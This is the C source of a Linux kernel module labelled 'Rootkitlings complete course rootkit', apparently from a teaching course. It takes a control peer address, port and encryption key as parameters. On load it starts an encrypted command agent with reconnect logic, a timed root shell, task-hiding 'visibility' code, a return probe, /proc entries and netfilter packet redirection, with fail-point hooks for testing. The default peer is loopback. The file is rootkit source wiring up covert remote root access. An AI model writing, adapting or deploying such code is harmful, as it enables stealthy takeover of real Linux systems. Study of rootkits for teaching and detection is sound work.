// SPDX-License-Identifier: GPL-2.0
#include <linux/err.h>
#include <linux/errno.h>
#include <linux/init.h>
#include <linux/module.h>
#include <linux/string.h>

#include "aead.h"
#include "agent.h"
#include "agent_status.h"
#include "ipv4.h"
#include "packet_redirect.h"
#include "platform.h"
#include "provision.h"
#include "root_shell.h"
#include "rootkit.h"
#include "transaction.h"
#include "visibility.h"

#define RK_FAIL_PACKET_REDIRECT 14

#if ROOTKITLINGS_FAIL_POINT < 0 || ROOTKITLINGS_FAIL_POINT > 15
#error "unknown ROOTKITLINGS_FAIL_POINT"
#endif

static unsigned short peer_port;
module_param(peer_port, ushort, 0400);
MODULE_PARM_DESC(peer_port, "control TCP listener port");

static char peer_address_text[16] = "127.0.0.1";
module_param_string(peer_address, peer_address_text,
		    sizeof(peer_address_text), 0400);
MODULE_PARM_DESC(peer_address, "control and shell IPv4 peer address");

static unsigned int retry_base_ms = 25;
module_param(retry_base_ms, uint, 0400);
MODULE_PARM_DESC(retry_base_ms, "initial reconnect delay in milliseconds");

static unsigned int retry_max_ms = 200;
module_param(retry_max_ms, uint, 0400);
MODULE_PARM_DESC(retry_max_ms, "maximum reconnect delay in milliseconds");

static unsigned int shell_timeout_ms = 60000;
module_param(shell_timeout_ms, uint, 0400);
MODULE_PARM_DESC(shell_timeout_ms, "root-shell lifetime in milliseconds");

static char control_key_hex[RK_AEAD_KEY_LENGTH * 2 + 1];
module_param_string(control_key, control_key_hex,
		    sizeof(control_key_hex), 0000);
MODULE_PARM_DESC(control_key, "64 hexadecimal control-key digits");

static unsigned short redirect_from_port = 5400;
module_param(redirect_from_port, ushort, 0400);
MODULE_PARM_DESC(redirect_from_port, "loopback UDP port to redirect");

static unsigned short redirect_to_port = 5401;
module_param(redirect_to_port, ushort, 0400);
MODULE_PARM_DESC(redirect_to_port, "replacement loopback UDP port");

static struct rk_state *state;
static struct rk_agent agent;
static struct rk_netfilter_mutator packet_redirect;
static struct rk_root_shell root_shell;
static struct rk_transaction transaction;

static bool rk_packet_actions_enabled(void *context)
{
	return rk_state_actions_enabled(context);
}

static int __init rk_init(void)
{
	struct rk_netfilter_config redirect_config = {
		.match_port = redirect_from_port,
		.replacement_port = redirect_to_port,
		.enabled = rk_packet_actions_enabled,
		.registration_error =
			ROOTKITLINGS_FAIL_POINT == RK_FAIL_PACKET_REDIRECT ?
			-EINTR : 0,
	};
	u8 control_key[RK_AEAD_KEY_LENGTH] = { };
	__be32 peer_address;
	int error;

	error = rk_control_key_parse_and_clear(
		control_key_hex, sizeof(control_key_hex), control_key);
	if (error)
		return error;
	error = rk_ipv4_parse(peer_address_text, &peer_address);
	if (error || !peer_port || !retry_base_ms ||
	    retry_base_ms > retry_max_ms ||
	    retry_max_ms > 5000 || !redirect_from_port || !redirect_to_port ||
	    redirect_from_port == redirect_to_port) {
		error = -EINVAL;
		goto clear_key;
	}
	if (ROOTKITLINGS_FAIL_POINT == RK_FAIL_PREFLIGHT) {
		error = -ECANCELED;
		goto clear_key;
	}
	state = rk_state_create();
	if (IS_ERR(state)) {
		error = PTR_ERR(state);
		state = NULL;
		goto clear_key;
	}
	redirect_config.enabled_context = state;

	rk_events_reset();
	error = rk_worker_start(state);
	if (error)
		goto destroy_state;
	error = rk_authorization_start();
	if (error)
		goto stop_worker;
	error = rk_return_probe_start(state);
	if (error)
		goto stop_authorization;
	error = rk_platform_prepare();
	if (error)
		goto stop_return_probe;
	error = rk_transaction_apply(&transaction);
	if (error)
		goto finish_platform;
	error = rk_root_shell_init(&root_shell, shell_timeout_ms);
	if (error)
		goto restore_transaction;
	if (ROOTKITLINGS_FAIL_POINT == RK_FAIL_AGENT_WORKER)
		error = -EINTR;
	else
		error = rk_agent_start(&agent, peer_address, peer_port,
				       retry_base_ms, retry_max_ms,
				       control_key, sizeof(control_key), state,
				       &root_shell);
	memzero_explicit(control_key, sizeof(control_key));
	if (error)
		goto stop_root_shell;
	error = rk_visibility_start(state, agent.task);
	if (error)
		goto stop_agent;
	error = rk_events_publish();
	if (error)
		goto stop_visibility;
	error = rk_evidence_publish();
	if (error)
		goto unpublish_events;
	error = rk_agent_status_publish(&agent, &transaction);
	if (error)
		goto unpublish_evidence;
	error = rk_proc_publish(state);
	if (error)
		goto unpublish_agent_status;
	error = rk_netfilter_start(&packet_redirect, &redirect_config);
	if (error)
		goto stop_packet_redirect;

	rk_scheduler_start(state);
	rk_agent_enable_commands(&agent);
	return 0;

stop_packet_redirect:
	rk_netfilter_stop(&packet_redirect);
	rk_proc_unpublish();
unpublish_agent_status:
	rk_agent_status_unpublish();
unpublish_evidence:
	rk_evidence_unpublish();
unpublish_events:
	rk_events_unpublish();
stop_visibility:
	rk_visibility_stop();
stop_agent:
	rk_agent_stop(&agent);
stop_root_shell:
	rk_root_shell_stop(&root_shell);
restore_transaction:
	(void)rk_transaction_restore(&transaction);
	rk_transaction_dispose(&transaction);
finish_platform:
	rk_platform_finish();
stop_return_probe:
	rk_return_probe_stop();
stop_authorization:
	rk_authorization_stop();
stop_worker:
	rk_worker_stop();
destroy_state:
	rk_state_destroy(state);
	state = NULL;
clear_key:
	memzero_explicit(control_key, sizeof(control_key));
	return error;
}

static void __exit rk_exit(void)
{
	rk_agent_stop(&agent);
	rk_root_shell_stop(&root_shell);
	rk_scheduler_stop();
	rk_netfilter_stop(&packet_redirect);
	rk_proc_unpublish();
	rk_agent_status_unpublish();
	rk_evidence_unpublish();
	rk_events_unpublish();
	rk_visibility_stop();
	(void)rk_transaction_restore(&transaction);
	rk_transaction_dispose(&transaction);
	rk_platform_finish();
	rk_return_probe_stop();
	rk_authorization_stop();
	rk_worker_stop();
	rk_state_destroy(state);
	state = NULL;
}

module_init(rk_init);
module_exit(rk_exit);

MODULE_LICENSE("GPL");
MODULE_DESCRIPTION("Rootkitlings complete course rootkit");
